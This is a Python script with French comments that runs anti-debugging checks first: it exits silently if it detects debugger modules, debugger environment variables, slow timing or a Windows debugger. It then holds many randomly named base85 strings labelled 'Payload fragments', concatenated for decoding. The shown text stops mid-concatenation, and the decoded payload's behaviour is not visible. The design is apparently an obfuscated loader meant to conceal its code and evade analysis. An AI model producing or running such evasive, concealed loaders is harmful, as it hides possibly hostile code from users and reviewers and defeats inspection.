#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cr8GOFQycHmbTN = 'BjWRf4!k5ecO-OPQ$14$q2|3>@;4&Z^TY@Noo`2#!;H%)eyJu{IX|`r0DaB'
_ciukzfgZPdCgA3 = 'S_!42ai+Gj1KhwLo(~>zr9Oc(&%-7EW`zJlFPqzg;_aYW>1ayf$(0ZYcf2k'
_cp7Xf38BKOW55r = '5tPe}T2C!c!Vz3D0t{vYfp)}7JijyXbv2R|^*?>~CA_@^bw$K;+Xld^0d?9'
_cfo0CgUimzpbVN = 'rkDcj$3CcI-iQ+Wtq4?2uQaU;x!Lo8NEa&`NE#$eh63@00J8k1UT797>I?a'
_ceAap3cOju2Msy = 'R>VVPHwLOH)vO!@#$z*P-g@%#*knQE-JB#I4`0>UC_F^rDw)L(NF?3A!zxx'
_cyvYr9zgTHlVsW = '{K-DuT7eWiKRZTcH^_pwVnq>@e~K5}=dBR>n}vq<9DO!mfagYjSm`rXgk<E'
_csM1o6x9bbw66p = 'Ws`~OPs=JSzM)>r+z&Z?CPbTEkD+<(S!~z$k0g>!0m<4G|;^}C<cL(=J3r?'
_cxIc5fx0hWC2pn = '|xmDD>vy+y3*QFR~y{<FV3&hVGg?s*C9>d5u(m3pD@&RSUar!)zIU&(Jim+'
_caGJjheeRcBACU = 'UTfZ6>8n_fKt@S}Y2_=ul-E#9k7@N3!#?l;{47>Wc|<snd=1YJ*g_wz-`)E'
_cdhtlE_Clo4mAQ = 'Z^7cjHBC(3p$i^?CD$Z)ogZT<Dai)2P9E~fzykWNFpxE2MEFPg;TbX3xs}6'
_ce14t9ESpvsjwM = '$}?3}u(4CNQ%iXjqjax<A)0yl)N~1U!xU7Otx#Q;A5B>yM!#N{(JnS&_cLH'
_cfC4R4yKrasY57 = '}35{?p$3r#5fD3aqmPUOF9dGldhtUWS2u6>M6ot1W%{-RcP~voL?K0rRjTl'
_czzMWMHTrgZsFA = 't;?s|`-kECW~20OXE!m5g9gQaEBR06p4vnW=SYL22i<9iQr%@oHBKbFp_U&'
_czAfEwtDZ0zls5 = '{5(wAw-<42Sj}AZ!XGP}orj1B_Le()x|}-zEFDZY}LvR1O|hc4j{>USD-H@'
_cnv_Bni3sT125y = '97l(BslN;*7xl`CER|p^mV;#bZ(NHwC1_1QZ?a@8{R!T(VhCEitQ6*PpOTg'
_cv09OTPSr82gGh = 'ZB~_ZF$aqJpu-6Mwp1KX_szLdr=W-NediCDxiPu4@nQ?EK1f#Iqso2}65%7'
_ciBs5CURD2VcHx = '82NmU2h^@j~A&<{Y=hhT6%^xAITr9qQg<-Ws3WLaX$P7flCJ!=7nKQI0<kq'
_cy7Y0mwCyNfocg = 'StmAEPVZnQ{+YUO-92|2A#LE+p#D<la75K=0oBkEeqD!bh3NP5~RFHvh(Mj'
_cgTTtFrOCJUuy6 = '`=O0!1uvf_ZuI2U>UInfu2_&ovs)lT$RCZ!~Piz<N|)hNWapaii;q-(_Blo'
_ckeNiYd_xeQgvh = 'ZXcQxk#lB_p347#~LDY0dANsEkWqf73XcBl^RMrsbuGyg^Jigwql7ll|nfN'
_cre2YbbWW7AlKM = 'lE4IhU9DVAo~JS$+vx~DW<L`(cg$#ue4c&*kD4-&`_t%DsMEIJL=L|p6v0V'
_cnZgEXw_mLS49n = '36}&XOB5C4vLoIJ}1?^tMMwv-*h;MPZWd*;XvHc;BT&Vii@Qt<og=k~~nyj'
_cfL4f9LxuL_6Bn = 't*uHK%~gGikmXcU=OF90oBxosGP{Oz-IegQe_!WSvs@OMJaW248DZ9F+bCu'
_cgeiHam_sVy5pi = '|D=$;uopE>}`wwh$(j`0*FU^S=%`7c<#2z;Rz;BhgdTSaj-~vNDsC97t8%I'
_cpHJI7trLsqZkR = '0_lgEwxu%lV9+kx<%lxye(E04v|J(eiBTfVm7IhQmz?M)qkp?p-Mz{i4JZ6'
_canVsoZlBdl_Gw = '-F6`5Plryz71QzBs;C6PCad>5Ld`4I94KeeM?~eCIOJ}#O+|X(@asw^;wVq'
_chKrgq7ujmJ7oF = 'COmmkdOYPpNQd#*fPk>XEq+si_859L=l!&E!`@4%Vz(FEs9=VwjM*U5mZFF'
_cpjQsZB4rJmbVv = 'C=)av(3H0^y_>v=7T$~ccJZca)z;JfQ5PmoQWR2UGsR|_M9EYO-gQsgzG9D'
_cyyxN_rCcxLyUT = 'a1H!veJybYpHYk6LDMv3`%-;h)j!$rht*Z?!;zYs?xQGX?+;=hD3pH^EKNH'
_ckI8vq1Ux6ItrD = 'yLkCD;tQ4yp<-LTLoEArx{NHusuT|Psg~1+V@h%l$)Aef6;?(d?m&g1KOqm'
_ctkaVD_M7zXgVk = 'X^|rwSKEuCX2Xg0VpTMNE)#J1=5{roi~bko6`+aFK!g#5^r~KfdDz=C88^2'
_ccxh2G9LHPDXPS = 'c83)I(At;WN+Sfg|Z;hU+)efjZ3!apmCswZ;beMkvzZ;f^F1H*31Qd+A+<*'
_cgjk39VJ9voINe = 'fVaWbI3@E-DXSxWm_e8R>rLLx$LsiWekd0U%>T4^`OeCcXBR_`2YnM!^fhv'
_clVUCf1UkTKfYT = '?2L!ti%ODrsq%X%uPnYlWUHN1j7Mg~A%1|2<-}#=O|!R?f7wBGzPV6=lq2F'
_csUp5II0MAVS00 = '<Gf_6;EtGiP~@D4OnS>87dx5ABVRa0Hj<yaG%Aa^^@z+f%KQT$hV}Ou`VCK'
_ctj4uJmShDEWZF = '-&+<Q5lkoYefhK^rv?Eo!vY1{e23CrR&~`&TmuKdAnaNV*QdOmubu|Pxry`'
_ca_akXBgrHk9Yn = 'vI#r>cdflSxR|mMTYA~YrlL@9ZgkCcyh+16@XLOz=Aeh+D{8ENv5g&hAsU8'
_cpIOATz3TC414I = '8U@)Cq*sYoW^L5`>>Hp`5})-OiQ*u_zlvEf|nO@Q|{Qj{+DssVH!cijK~L5'
_cpBzsHSr09Ajwx = '<Ix);ocBu`fVD`;mG4Yq!gg+ns|w28xaa(%N(7DTj$)u8948JhhNZ0C1qxV'
_cgQaZQWcQrg8YK = '*UMZT9}3Z_w1|2vIxDNyv~hxV?-SO_karyswSKUrQbg|Ae^%<0zPwl9|*x$'
_caupHev9DjMkHK = 's@}UY=<|PV_};@i=avuoZ2@qRb3S-C97L<BJR8kBDZIXQ>t9=OUiOXa*<N3'
_cqbNldbxcawjqc = 'w;LZVlTA;da*T6P7<M{aul>dO;iMmF&Kv5VhXi~QbIrE+yRLvyAKwgRceLy'
_cqWhpfypSQ5BnW = '=Me8LQs{#4Y3E=rQdtcM`~3Ej=GNu^k$%c@OV7h%pH>VLwXK8XAzL7Ee+$J'
_cbzZqxKZr1psJp = 'c37aZ&}(X5a?Exq}43+-d2}T82&aFYYz4e1B3w*sWX^k{jAaA+vwjVOkpU`'
_cr56tjOAxeELzD = 'LI|?V<CW;wKSC?hvM%KH@?{R0b}<v@NnpT_<)+jWP}{plj3Wnnle+(g?_18'
_cqq4twjBt6V9lT = '(6y0UZ}rXw=&?Cq?hQE;59!Jm@;1c|NEz-ER}cJA`xIo*?myGpW2LGd+B<P'
_cjg6i1qUe3FxoC = '%sgYJqXBd!KhmE&fQ<)L&E!F|^%e_<yaFVGVEDB1N96Pm4wT-ZFt>#%@H*c'
_cmzP2wwARz7SgZ = 'D>Bk73IL(}3R(Nmmp^UNu36vp}9hhH<FK-<WX-{8M6bb(TX#xy16&zv_7ib'
_cuzKAthQk0b83G = '-}o=ORPkB!yGsbSifj^Z#we2k7|>F>(4;<f?w(flgsycwlO@EXIiDx|=n(M'
_chloc3UoxtmGHT = '%4zzRDYQyqAVd2WK1Hz8i6!u`^#M&M^&&|!$ZTR*SB!sKTMEwD3XC{4d_fH'
_c_NCHfG52bRHZy = 'ID0K{Qc8o@KHYc(>i&I$i<55iLzUBtl$KdcbZHakQ<BGa_gsEIt$jGM$}kY'
_co1Pr9PGcBfPBC = 'yX%I1ou>Dy9omI+EE$)AGCCC}ev+_JU#0toxxC=d;KdhrYylRC$vDi+a0<J'
_cwAnYsxsNKgFOV = 'eB|2r}S@zV|~9MmOoGg#qEMHbdz$snN%UNDa!s@JYG`!4BlqrN<G+2caUV*'
_cqD7MCzXa_1zO7 = '~ACq|Q<UCy~oYm(+4Za%<!XK2U=?j^(&<g`p8}&U{^Hu;FVGBa<gdKqsdY3'
_cha5DruS3aW0dc = 'j!1>l!z@uPMxm2b><+rpuj78*qG2n18FJZya=fPCs3xbF6`u8+%@T4qWROi'
_cfrysE1UQFg1Z0 = '4OSSV?~GUnl@R-m$|<xrvwz`glB8Y>tK0bjn+lywLjqQgRn1;nyL>)20@>S'
_cdFlvYW4z_LDJH = 'gm`tG(HeHa1&y3(}e7l+nNVzt2a=$GVxXf$f)-%0uCB8n+sCS6&ZblSn>kX'
_cnLY59qIdOdve8 = 'km&wdvA{V2##Hf`Mumv0^?J|0UQxBpXTw?3Q*aA1f3pEep{?R>}oK0LEuVw'
_cx9uGfpibUsBfy = '_0-wI)7bv@xAdbcpQ@8lwu8%|(SsDbI91rD@9x&L!z<SM}qq2GdIF%k)Dn('
_coiTxWGduq2AZO = '?<rj<!uvFu?{h69++&^o~B5ePMeCSEw0OaInQD4VjOO079f))AA^0#6bjHp'
_crBOuZ85o5kTxq = '9`n%dy7oxk@JdSC@UAfDE;1Wcl;nr#BhB-p7BuZ-)^F~I?bu&NE`#2Pa$1`'
_cwMncuAyKD86vy = '%g$9fS=~jZ3tYK;g(9Gt!?FNxaIGQqoz+LDo0!U;j2y1rLC@Cm2>n#C-E@S'
_chzrCAdhEdF81L = 'IymvHjilG#-iC-hP}w#0`;@;a5tiojNqKyG2x(x}grd=6`}6le}d%Two(B>'
_cgTKcNolT4TdFE = '$|onF3QvEb5M>=6}_a{2=niKwzgQd!b7T923vSm1vvmfe=5C&SBZC#Cv@%m'
_cccwMvKg47RqKx = 'BNE$*d$1=tz0&Ew(?xRQH?=bklHZJHw1tw7pq{x_Lv9ca+=)@WRNz=CBs|9'
_cjoTed2jBuwJQK = 'OPsAAFsZ1gsWe>qywn1K)>moFKR`Xuya+c%3=LGtG>Lht)mHq$ou4|Y=$^o'
_czEeWN9WsQjlXu = 'GH1Q3gkcqbDHKpFA!(yJ8m?L6fXA=v5t8!r^82a>v*Ef57mw(T4?&51z9*T'
_cuB0iS_F8zlusY = 'VCGi_PVLMo83Pntf_7N0t2WFX#ik9W#DTj)#K;=&xw$AJ_c*do)@?)W{sG_'
_czntsk7BLSgTmR = '}3#Eliq++`!yJnLO$AHgckKW=XR)K}dU<Wf+cvwRKQ0Jirq>Z5@SR;mMu>`'
_cqcc65pxbR8lvi = 'nqlIg&i2i2$=vK3ud)|r89Vm-?9WH9I70XXnk{J3gqaO1}r^gyEdIg3c-Z5'
_cnbfNcZAckt8tc = 'Ky)wp>Px~L)cp!5R6m5g0-R}+<=wlI0^ro$cz9Snn3RQtN}TvNd!k~Z^oqV'
_crhMnT3XqL3lHS = 'll#m)Qy!pJ~3NLJ)RQg$Zjg4!`ip{)}y+`61cnH*ZkEUrI%;d0-4N;mnaUd'
_crPEy9aSogKxic = 'h*C{uO?H9#;|(+t7hHw%SJ|8~o56T2~bZF3U#{3u!lisw3f=^%){uI^=swm'
_czH45NJbgnudjv = '7=UzWGfioU=V($f1?lq(>@S7oP`SVwJKrS0M<|@aEUSP_o-Bi$@w|u4A!L8'
_c_KnGipyNEDshc = 'ucB0rfNO5(T0*$p`#O<^z2&3ptGcQk(G8YkpmE(eJwg88(j-6n^EXk&89Cg'
_cxgOAYlTDYnJ5B = 'h*_CP#Z>mwV=vX4rclir9)|8_Lv~z8rB!b8Yk|0p#h=3^-&cv!)`lUI>AJ1'
_cmNahZaMmEmGIk = 'VlWfdSM@X}VVo3PfZhAVX&W`E`V{+V<;J`ml?SVb%*-9@E{!1fwD~F7t9oA'
_cef_djiKqvExf1 = '%ch&K>U%)h0T&y`B)X)9$uFEjFD5Wi-lwf$6P^Tp}%^9vFE@`WiW|D|BAbb'
_cpjqR5Oik9xbxe = 'uKmCHr<rR$q)6umLGfasARv(&AWPC0fJl_by(Ppr_v)N~GaHxUi}=gpwO6H'
_codbFcqc10nTjo = '69TWF3fxCpKP0<Eb5QFbcWCzUfy%@`2{DkI-8lBT=6EnH1mp`hmv?nSEdKd'
_cqnCkMl2rv8JpR = '6d(O~egZ}yzP$xAEcjk+kfltF^p=%fs{HvFcnFlMscUkScc08wVH$3f7hGS'
_ctQbnxXAonF4VL = '^w-AqTE!N@zCx;%)0juO+O_DNPKQ>b=@x#Ke+>W>82GbbSE=P=d2A`LRA;#'
_cjWALa2NPFi1Ar = 'v^RJbDLtRYPoT*5&^pD-d|J_B9Pa5WelMd$sljwof;UQLNg4ob6%i>nZ>>6'
_coEB3rUqM3ppnt = 'dQ-{_nc^htll{FCti{W?O}3RcsztCfR%}KdT&B<~i?1TRh=r#p%oubixqWg'
_cmTi_Nzeyhyfl6 = '3xZz*Gtux4`itD5mtBUp}9BvkXe;*r|vA*!G{)(S<CHAEf7Ay5+YLKa%~l@'
_cjchJXjVmpf5BJ = '%ksxR<X8H=Ih*iSgTH9W+jtl~NJxdS_Z^GU0SytVRV(s}2zHfV=mXs7;SW+'
_ciIBju4NaBiGen = '`eOwG{meN@x0e>s(S}?4K7}ig5UNK4*-R~1P<&^{f+^6I;d7q9HYMcKb%~I'
_cgokUE3K516Lss = 'i2p*QUS)ZDJWO{>iI)`(vsdQGS|XQ%bpp{G|a;oR2%BPKA4u^mB!+-apVG}'
_csYbZcb0Uuk9HT = '&FfMgvx|Kge5_Rw;f@SgyP!TXswxes_d4y-ZG*D*YHjez?aj{kioY8aRk#_'
_c_aIxPXnkZXJVp = 'Kk^R8f>t<bAmcBwz04DiCN7eqFSZxnx*L1k2`@acE|I`oDb5^n4iYtj9op%'
_cc3Y5MuJa0gFF2 = 'PS-!%(1%m|T`NJO5x^}TMV`N{>9d3^KUpWJm7u}2b}sQB9rfp`Ba#8SysA8'
_cmy7sOTYvtfzG1 = 'ptE+QF_c=1qo4_4ANqv6V;xxYm`31Z<+YJqCS4#Bsy+WAm^&NipDkZAF=AY'
_ch3aI_7TDgq3Da = '$CPOhFUMDR}2udqE~2?Y6UKF9`2e?XFa6EqlyqtERaW5feYhu4-7(I72?Y}'
_chOz5LDP8C9n32 = '}Grgvd5Y9p?fr?S<oQvk?$iwNk+|$}E+2mYuOGV1xk~%#yQ<cTdyWfZ49}$'
_crfk37ZF3wKLla = '7I8WCRn$AW!^z!PG`x2n6VX#jUvb;DtGST_oHia>9Y61*l5z;<Mb^mpBUZ@'
_cktaTQY5sCSMbU = '$0$<cj359mBvkxJQ_y!4^uPXZC*EtX%0$j7g5nLMIqPU_BztP3vN0q?_)8h'
_chDxKBOu2NVyji = 'e(B~jqJPk})@5+2p@j;R<)IU3Z${eWZHbSmWGGA#Eg61v6Bv~M?%8B7KU$A'
_cgbSSOcoCinUXV = '%N61GnE)XHE90D7uUoR@PzF@+wbqcB7oEc@x1^<NwA2zG>@r7MPjdw9zDO#'
_cxehFKBCuhM83S = '8r{d)AHEQ!FuMGR!NnTbCyNG{v*1W0nw5Qq1{UOpgNH3?q4;qho42Kv{DJH'
_ctZM3TV6SCPB4z = '_VXSZ>sjUg_@PW%$@1N4Z*y9K`m;O!o3A8{Jrg{#*RK2>xb43m!P&ZIqCd4'
_cxx2KZt7e9NYQd = 'N7ijJbNGef!;Q9L9h!fBF^)6d<F?4!3m#A$k3dBeu~Q_+NzGp+nytq2;=tj'
_cf8Uu8AhpR_if9 = '?iF3OLI6%BF1~oKLQx|$^Gy_H&MdP`YO*e8&15}RhfQKSFPYO6SESifRKDL'
_coyMxW64wr7UYD = 'nMak^go(pl`SH^fkKorFzh38yNyLV*#Tw5=dikw*`IMVj%HEd24M2eb-rRO'
_cc475OvqE4oodA = 'qiBL10-&zpvT_hM&<Pu@@lj?<HMGFS3${ad5ks@gEP51L<Okpq3<?=dtjbz'
_cvOJOAyoW4h_OK = '+!kG{~S~MxNq{(|8ZPJ6z!1rleBsl6e}g%pY7ufHp8oRr>(>`{YxsC0aH81'
_cbg09Npuhia_QT = '0VIEd6&%v@lUdlwtImg=CSCTYr0u_AaKZy?!v>p!fNY{rE%FZzMhe_K#Ac`'
_cjQgX67bgqEk8K = 'bce8RH!4R)}2Fb+!MI)PbU3}y!fN36)YL}=w)|Df8Z!g6a&z#~`3z?O=3>g'
_cmBTXEl4H96jsn = '8|x7%SMAW|*1hzaw#cfR(_aSUPHq2XF*gB>T=V;JNrPs{V;=M|l>MoFg%tI'
_csFCrg034tuj5y = 'X{xB;c*nlN2;Ij@TEpq6F3zd<q>XrJwE}((P}}LM=|eP4idc<l(|Wxt;5fB'
_cmjhxhYeeNI_hx = '9snGX$~ZX4yKfBcvgp`voJ3I+@hMLF8GCeD+Am_K4wZb7-=3WI-IDot3)}I'
_cfQhmvOvXYc54w = '>-BT_RU_|TP?>GN72EvDvR@PY)z@@b#ByB51Duz<1J*azAZG!J?&5N_ELE0'
_ceww3XC0IdSVaa = '~wN96Y|H%oac6rQ&VNOG|@?$k~<5vlOlTjSJEZO4uD#eC`64<=odsB{{X5F'
_cj6AzIXh2T23aw = '8q@C86u>YXb%seVXS7F)ySu;2q}=u;OgIVi<{p9I-pjzt>PF$>fX8@%BiP$'
_cnCJGsQ1_pwCzj = 'hPI3}HqE?caffRJn(_I`3>(8>>alwsWLqJi!W_u+X8k04d)>PBrUv+(eA?p'
_ctZXzFbcEXjmAZ = '6#Mtk8$u-Nx^$IVZMR`ELsB*B0lA5{@8BRk~RfF&lZ0Z+*;p$C;Bqs>%*gQ'
_cbAh1EN0_H1Tto = '-)`yvJg$HD$o@sh0&);V_1*EIPS0`d%h#vKWS53Z|Io8~3pWQIT%)Ei@Mmc'
_c_WTtgh5gENOvn = 'WgKwX_gM=}#fb+I}P#1hBMUr-xnj9Qp5lSiHMXHBG?nL{D6-lkPPfxbcm7r'
_czt1MPtCRxXobD = 'P{QJ-UV+svTOV77VJLN3b`xyoiwEwL!J@B}^<z7LiJKoz6YCcV0X(KXek4-'
_c_sfn1eqsr9Co0 = 'pWw81Ur0<0<1*R;hB*`Iu1>fD{U>aMT?n%kP<AgL8^keZ)69g_Z2TyFZ#)V'
_cd5Z4nL53iOZQd = 'eU!%*@|>(8ezJeZS6d-N2C%J#`*3<gJv5^lpC=mSXD4PLfG<D$S8tiHQ89g'
_chGxuQ52yf9EIU = '<4E((t#-G5hIsd~fmQg@JeyRW4PTQE4#4-E@tO`e-{BcVM$P`Yu>fy#;y~b'
_cdq2eQkx5n_9kk = '^ta3n^aW!_r;UBf^pQcVV#Wd#d-ez6^U%uST_k`!)rQ7eA+0d1iN#d(*$Sf'
_cbEh66Qehwxnf5 = 'j~Wp<oDLs_yur-a;iZxTz&@ekFvd&LDVR^BhdGhX2p<d$$xQzb`TmdwW$3V'
_cuoyb0883jw4fp = '(-N0iMmRcI;VCfrK(6`iKF>lIIhvq@{Wy{geP3{_qReNLA_b|KC@5En(}JF'
_cg1GqyMQoI5XoK = 'WC~QsGl}o0>Ls$f;$`aSH_q1IjNO|=<D8YG}MYx^+Ew@r=4LQFk_@|r?;(N'
_cbIxCJ37pd5hjE = '`*GEgY42OO`hWfiYQFde;jmQ};OqUJeMA{kA7j0_C-F`p($W*zNUh6LEx6e'
_ch0YsSZC3XYSpM = '`u%0|nENCcWuhw3s2<@+T4nxEryaGVe{(2+sIwbI1X8RdSNz%te6nc+k+Qi'
_czhxdMshGP64QY = 'K}M&e+yA&8gO1E-j}(XUVU#$PY~$GWbzcf!-T8`6Deospk4?6zV6@*em=L9'
_c_TEfSgEVNqcNX = 'G-Bf-l4tP3RF};;>W7o=g|=GT*pN$bolzjeuG=)?(eh44m{?{3EBB;R0}FT'
_chjTPEEBXBRVjX = '9DrroGC%_i;e0OX0FTqJ|nmYG+O3g0m4slQhB=j)mDtSPK<jW^>fR)pY`M9'
_ctzKxP2Vw47wlj = '+s{>y>@2RGL_;oBzX@~j^lrPjLU8e`lo<|3t!T-rsE1SKrK|ECvJ)DVw|`6'
_ctnTcts9suHdsH = 'q)9j`!l5y=aU56Z#QDwENZa1!s>|`CZt-(OpSe9!{7Jyfssk2Of%J5x8N||'
_cscp86Kw1aSoGO = 'yT#(SdD!fBLt1AozhWOO*b3bz4mxL(#WA<r5@Rc1X42^sNBXo%)})`@kYt5'
_cz_esl3Lah3pC4 = '(Q|rL3gnat)k|B#uS}vbDS=jxw*f8<aJut?92`1UY#oa-?F~@g}d%o{jcBk'
_czQMZDfoTbtyx2 = 'cuhG-{D*gF^3?R_b0Ke{(Hq&mAjoHAfe0<(kgnF2dob-+)M-ELWjij5^maV'
_cjIre6cKzA82gc = '*5)2{3K4(4ngxHAeGHF&R`w#P)~#x-@6PI$q3uL{4yCO|dp)hjS%F(f<byK'
_c_d4lc60QIaitC = '=Tk~nX%A1V+`X-B!L|!ZA<s$S}qlkkPi^!tU1c#@nLRab1jt>uTzTynn3nA'
_co3MRKqo24u2lI = '+uUzD_J>Xybf$NjBPVW=jp!C<N8g&IE$SuHM8EF+TV=#}!OnNEW}16|3fb<'
_clVtvkOn0dN5GA = '^JdMS6NFN}io}o^n|rkjeR0-!ijO&j&POhwv$o@KgHVZV<?PmWjM3`0Wb-7'
_clUFwru599CQkS = 'd-A7jE>rjXSu$g!`AQc_He1&G^5}st{;g2n&3!QC+kM67S67IcZDgWt(2eZ'
_cjJJfpsCvDOlB6 = 'L})ZiL2T;ZV+DC{0uzB^Y`T-2%i;bi>kIBDxWWkfcj|+{^(9+{)0#1a>b0U'
_c_aLzicTWzVFA5 = '8m8HfNhGnt3A6ELv^4Amqt1qXjkEb=#^dTqlUc6nzdowcZ514%ED<shKBXT'
_ctT3gv8Tt9462w = 'Z?Ak~}zSFfl<5^vQK6-DFUuAJ^I%p}W>1|QyGJRs&xaamzMpnfkGiUZ&oSj'
_cqVh4WQmlqzXeq = 'CXz#Nv+@6vMX8U}rV0w*v@$G*|-HzccOyxY_f1w)f9w!RMq~d%b~tOCjfUD'
_cfzweG7Uf2itUP = 'raW+7rAik?TAmb>%i#c+B1n8!LQL66;0tN!G7i)+a7nrASdL%#-H!4E<gR{'
_cj5tmt0TIjy3Hr = 'K6d=i=sI<@L{0U86X9>^)TKX}dR;k7LoLG9NQ%p0YN7qM?XXS_M;%iVq*&p'
_crR7N__f7ugIem = '#w#*~(Q<QRi0^rUXQGK6d?Xb0G8N#ac*Np{Qy~V7Pa)ujnMzOX(UmL{iigE'
_clSzKnWxdWbWwP = '3ol9#2H8J3A(nqjg8cFS^Wd7g1nI$<}ll5o2vfVefMo#)&yTk9L3&i}rKA$'
_ceX92b_vaZTEZa = '3Y~-6d)1=LZWhAsi2-L`l0Me)(&BPbKJ`TQ#TRs(B%5y(2RCfTUH?`dwzju'
_cyKp8oi0wKdJEZ = 'Jxg{Y$7}x$tWOc42rn%FPx5`hzss!0n$P~tH%SLH@$@A(w2f>AcaC&RsH`k'
_cjafFKhTeZPsqp = 'o~3?iY2#*ZoufhB`ER~4%i9X_i{^k|HZMYW2vwf1QU?Fu8}9;m;$<m}y>`K'
_ckR4IiEJtGSSut = 'd-&$celnfyYcwk-;&(F-cp;Kw5#a28T8cnipn%}H}LYHE{J_5-Xmt}v0xLP'
_cus3QWiugdz8Fa = 'E;<3J3DM>QKbMnIKbRoUIQ70LB4mLrtJ1?1TcrSz`s3mEB16%Qr|=p~bKhx'
_cvjNWDFRWcwC2B = 'SgPW9$TJE?Av9?NtTPesrOCCRUr&8HYu>G;g}dSy+-DN_b1D1(xbn&#$u&v'
_cy17z_rK_slUOs = 'GpaD`(4(Ya@UXYNqeb?&3b*8r370J&WATb6vTAF&3X?~Km=+!@C~pP*!z>x'
_cjr99lWjMf5l2P = '(0)fbel{KlwI6q6h=55^CzdZK=PNrlblFi;07P{LkfDt+U48Q+5%A{EmCp}'
_cgPK1aZw1wVB_7 = '}<8}G*PCmIDU$2tNBv_O^gohes#{*uKg4iJT%mB_bMrvjh=Q;cACG|65hNM'
_co7ZpOXuYpM2r1 = '56gZV+h?BX^&ddjiizY<IE`m6!&6$CWEOFz8yq71nfx>YsA3ZYDuLhP~i))'
_cxnz84ZlxK6Raz = 'C|7B4@Pa)^4%>O3J=CxTuBZ?t$Ts!P@Jr0AezP80)F7Ndf1e{RI+MJ5``1;'
_ca06B9lXEEERkM = 'p5$oXnzs+&Q{(8QuO<zr(sX&leEqe@9vyKvSFIAQ2Px(6BO2J78MlkYB&re'
_cqe1crKf6SbiaJ = '8^h_1)gpED*`Ru~w%G_D(6?nwW<R}^V&*_Ok#qn&FrYSC@(qW!05tj1+%cJ'
_cm7eJHR_JZj2Ri = '$X2~x8BS5b4K7O-y$27Rq@x$#<(><Nui7d1GpbXf8*Oyw33<5nm^MW}fU#l'
_chmlDGh6WYF3Q8 = 'd8Ilceff5MeCxH1M!q~w<Sm-Kav1?SR3hZ~RyQlfsXQsB3`N^~*dUBjv1yJ'
_crZjXZZlfo5kpb = 'cBJz{HyaRYzNgU3BG>zk8u{K)8~;KUhG+2X8G4W6UlqXV_+x25!CNHvify#'
_crZ1RVbtjKW9Hc = '0n*9xpv1M{w_LA<U&V3!o{^#7PY2q@8VeG7eg|tTo1j{j(_K)&Jo2H_vtvv'
_clY8V4ey6TYeXG = 'X%!Ls=!w4LTko<DG(L-=6QDo57AfxPjp?!A2r;U*?MWc|)<%5&nn07XsN7p'
_ccfJEex9IPWohP = 'C5aOrCK`_@<&>&#@1n5S*=HM5nB@y+O(ixtPe=VwE6CWB~=!yxU(Mc}g7u$'
_chCILl3iLDl_cL = '8NwluP!IY&ZPV-W1e{}dWMOMs~<;ig+vA*SoC(i&g6-8vUDvIj&HL*mkyIH'
_ccLz8vR6acHLId = 'KKlC-0s1+wPC%rotv_bGT$L@u*+hClunioCaOc=`Nh(44<g}kO;83#`c%lJ'
_cmTQZx6B1FImTc = '@Fek3A)?ZsFA8JJY?XLu5A0e3eLMl&mRc6T-C7NHw!qK%(1U~HTwqUhlMmc'
_cfEQqVs9J5fqQO = '#8--D_1D<wezkXANm=TxvsRC=f`+p=tyu4qL2dGw)??&{gnlF0na<u*^7}k'
_ceRnJ2oBR4YGpA = '%9JtgoG=4SaCEJNRS8PQZf7U%}ZP3kGb#&d|JuITtoBp_t%ELz)4)T>A2F='
_cxDTUgr1LAWbf2 = 'qqmYMo57v)aT(z=Zm#AiF>4L=$}z2!-A`y$+S=>5v-L!$qCDiYl2cv^o@O#'
_cvRX5qdY0mORmf = 'x;c95iu>0OZI7>E_6hkX0H1Q7knSU6@a6i9E#Ih!Z}aI|j2CJM$0xVy0s5@'
_cpU2aAA77b1gnq = 'zH7%6=E9iv{SJp7l$MwlVuM8rqF4yx_^tGmEc^y3)UA25A4voj+7+i-wDB_'
_cwOUsQIOU5XVzr = 'KCJ{t$pV%(LIDuHP};n9N?vBzHj)A6eSou&'

_pvft5dGF9MGL57 = __import__('base64').b85decode(_cr8GOFQycHmbTN + _ciukzfgZPdCgA3 + _cp7Xf38BKOW55r + _cfo0CgUimzpbVN + _ceAap3cOju2Msy + _cyvYr9zgTHlVsW + _csM1o6x9bbw66p + _cxIc5fx0hWC2pn + _caGJjheeRcBACU + _cdhtlE_Clo4mAQ + _ce14t9ESpvsjwM + _cfC4R4yKrasY57 + _czzMWMHTrgZsFA + _czAfEwtDZ0zls5 + _cnv_Bni3sT125y + _cv09OTPSr82gGh + _ciBs5CURD2VcHx + _cy7Y0mwCyNfocg + _cgTTtFrOCJUuy6 + _ckeNiYd_xeQgvh + _cre2YbbWW7AlKM + _cnZgEXw_mLS49n + _cfL4f9LxuL_6Bn + _cgeiHam_sVy5pi + _cpHJI7trLsqZkR + _canVsoZlBdl_Gw + _chKrgq7ujmJ7oF + _cpjQsZB4rJmbVv + _cyyxN_rCcxLyUT + _ckI8vq1Ux6ItrD + _ctkaVD_M7zXgVk + _ccxh2G9LHPDXPS + _cgjk39VJ9voINe + _clVUCf1UkTKfYT + _csUp5II0MAVS00 + _ctj4uJmShDEWZF + _ca_akXBgrHk9Yn + _cpIOATz3TC414I + _cpBzsHSr09Ajwx + _cgQaZQWcQrg8YK + _caupHev9DjMkHK + _cqbNldbxcawjqc + _cqWhpfypSQ5BnW + _cbzZqxKZr1psJp + _cr56tjOAxeELzD + _cqq4twjBt6V9lT + _cjg6i1qUe3FxoC + _cmzP2wwARz7SgZ + _cuzKAthQk0b83G + _chloc3UoxtmGHT + _c_NCHfG52bRHZy + _co1Pr9PGcBfPBC + _cwAnYsxsNKgFOV + _cqD7MCzXa_1zO7 